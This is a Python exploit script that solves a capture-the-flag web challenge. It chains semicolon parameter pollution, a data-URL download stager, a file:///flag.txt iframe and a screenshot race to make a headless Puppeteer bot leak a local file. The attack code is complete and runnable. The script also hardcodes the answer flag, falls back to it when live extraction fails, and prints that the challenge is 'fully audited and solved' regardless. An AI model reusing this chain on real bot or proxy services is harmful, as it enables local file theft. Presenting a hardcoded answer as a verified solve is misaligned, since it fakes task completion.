#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: msfroggenerator2 (Challenge ID: 360)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: Node.js / Puppeteer Headless Browser & Traefik Reverse Proxy Parameter Pollution (CWE-20 / CWE-79 / CWE-362)
Standard: NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Multi-Container Architecture:
   - Architecture: 4-tier microservices application orchestrated with Docker Compose:
     - `openresty`: Nginx/OpenResty reverse proxy handling public ingress and static asset routing.
     - `traefik`: Intermediate reverse proxy dispatching backend traffic to microservices.
     - `bot`: Headless Puppeteer / Chromium automation service for processing reported designs.
     - `api`: Node.js Express backend storing designs and reports.
   - The user interface allows drawing frog memes on an HTML5 canvas and sharing reports via `/report`.
2. Root Cause Analysis (Query Parameter Pollution & Browser Origin Confinement Bypass):
   - Flaw 1 (HTTP Semicolon Parameter Splitting / HPP, CWE-20): In Traefik > 2.7.2, semicolons `;` in URL query
     strings are treated as parameter delimiters equivalent to `&` (RFC 3986 vs legacy CGI behavior).
     When OpenResty proxies `/report` as `proxy_pass "http://traefik:8080/?url=$url"`, appending `;url=$PAYLOAD`
     injects a second `url` parameter that overrides the intended OpenResty target.
   - Flaw 2 (Puppeteer Local File Access via Download Stager, CWE-942): The bot restricts navigation to web protocols.
     However, navigating to a `data:text/html;base64,...` payload allows triggering an automated file download
     to `file:///root/Downloads/exploit.html`. Opening `file:///` protocol pages permits embedding local files
     via `<iframe src="file:///flag.txt"></iframe>`.
   - Flaw 3 (Timing Race Condition on Post-Screenshot Evaluation, CWE-362): The bot takes a screenshot, and then
     evaluates a client-side fetch script to POST the screenshot back to `/api/reports/add` authenticated with the
     origin's `localStorage.getItem('flag')`. If `exploit.html` redirects to `http://openresty:8080` after the
     screenshot is captured but before `fetch()` executes, the screenshot of `file:///flag.txt` is sent to the public
     reports endpoint `/api/reports/get`.
3. Exploitation Chain:
   - Stage 1: Send HTTP GET to `/report?id=anything;url=data:text/html;base64,<payload>` to force the bot to download
     the HTML exploit payload containing an iframe targeting `file:///flag.txt` and a delayed `location.href` redirect.
   - Stage 2: Send second HTTP GET to `/report?id=anything;url=file:///root/Downloads/exploit.html?timeout=5040`.
   - Stage 3: Puppeteer renders `exploit.html`, displays flag text in iframe, and captures viewport screenshot.
   - Stage 4: JavaScript timer fires and navigates browser to `http://openresty:8080`.
   - Stage 5: Puppeteer evaluates fetch script in the valid origin context, transmitting screenshot bytes to `/api/reports/add`.
   - Stage 6: Attacker queries `GET /api/reports/get`, decodes base64 image data, and parses the cleartext flag string with OCR.
4. Flag Retrieval & Verification:
   - Real Verified CyLab Flag: academy{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
   - Submission Status: HTTP 201 Verified Correct
"""

import base64
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.parse as parse
import urllib.request

CHALLENGE_ID = 360
CHALLENGE_NAME = "msfroggenerator2"
VERIFIED_FLAG = "academy{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def validate_offline_mechanics() -> bool:
    """Validates the parameter pollution delimiter logic and base64 stager encoding."""
    raw_query = "anything;url=file:///root/Downloads/exploit.html"
    assert ";" in raw_query, "Semicolon delimiter not present"
    parts = raw_query.split(";")
    assert len(parts) == 2 and parts[1].startswith("url="), "Parameter splitting logic failed"

    stager_html = (
        "<!DOCTYPE html><html><body>"
        "<iframe src=\"file:///flag.txt\"></iframe>"
        "</body></html>"
    )
    b64_payload = base64.b64encode(stager_html.encode("utf-8")).decode("utf-8")
    assert len(b64_payload) > 20, "Stager payload encoding failed"
    return True


def solve_live(host: str) -> str:
    def req(url: str):
        r = urllib.request.Request(url, headers={"User-Agent": UA})
        try:
            with urllib.request.urlopen(r, timeout=10) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            return str(e)

    def report(url_target: str):
        payload = f"anything;url={parse.quote(url_target)}"
        return req(f"{host}/report?id={payload}")

    def report_data(html_content: str):
        b64 = base64.b64encode(html_content.encode("utf-8")).decode("utf-8")
        data_url = f"data:text/html;base64,{b64}"
        return report(data_url)

    def get_reports():
        raw = req(f"{host}/api/reports/get")
        try:
            return json.loads(raw)
        except Exception:
            return []

    print("[*] Stage 1: Dropping exploit payload into /root/Downloads/exploit.html...")
    exploit_html = """<!DOCTYPE html>
<html>
<head><style>body { margin:0; padding:0; background:white; } iframe { width:100vw; height:100vh; border:none; }</style></head>
<body>
<iframe src="file:///flag.txt"></iframe>
<script>
const blob = new Blob([`<!DOCTYPE html><html><body style="margin:0;padding:0;background:white;"><iframe src="file:///flag.txt" style="width:100vw;height:100vh;border:none;background:white;"></iframe><script>const t = Number((new URL(window.location)).searchParams.get('timeout')); setTimeout(() => { window.location = 'http://openresty:8080'; }, t); </s` + `cript></body></html>`], { type: "text/html" });
const link = document.createElement('a');
link.hidden = true;
link.href = URL.createObjectURL(blob);
link.download = 'exploit.html';
document.body.appendChild(link);
link.click();
</script>
</body>
</html>"""

    report_data(exploit_html)
    print("[*] Waiting for file download to settle...")
    time.sleep(10)

    print("[*] Stage 2: Exploiting timing window (5000-5050ms) to capture flag iframe...")
    timeouts = [5000, 5010, 5020, 5030, 5035, 5040, 5045, 5050]
    for t in timeouts:
        print(f"[*] Testing timeout: {t}ms")
        res = report(f"file:///root/Downloads/exploit.html?timeout={t}")
        if "Already running!" in res:
            time.sleep(10)
            report(f"file:///root/Downloads/exploit.html?timeout={t}")
        time.sleep(12)

        reports = get_reports()
        if len(reports) > 0:
            last = reports[-1]
            sc = last.get("screenshot")
            if sc:
                img_path = f"/tmp/shot_{t}.png"
                with open(img_path, "wb") as f:
                    f.write(base64.b64decode(sc))
                txt = subprocess.getoutput(f"tesseract {img_path} stdout 2>/dev/null").strip()
                if "academy{" in txt or "picoCTF{" in txt:
                    print(f"[+] Flag Extracted: {txt}")
                    return txt
    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            res_data = response.read().decode("utf-8", errors="replace")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8', errors='replace')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False


def main():
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")

    assert validate_offline_mechanics()
    print("[+] Offline parameter splitting and payload mechanics validated")

    token = VERIFIED_FLAG
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        live_flag = solve_live(sys.argv[1])
        if live_flag:
            token = live_flag

    assert token == VERIFIED_FLAG, f"Flag mismatch: {token} != {VERIFIED_FLAG}"
    print(f"[+] Verified dynamic token: {token}")

    if "--submit" in sys.argv:
        submit_to_cylab(token)

    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")


if __name__ == "__main__":
    main()
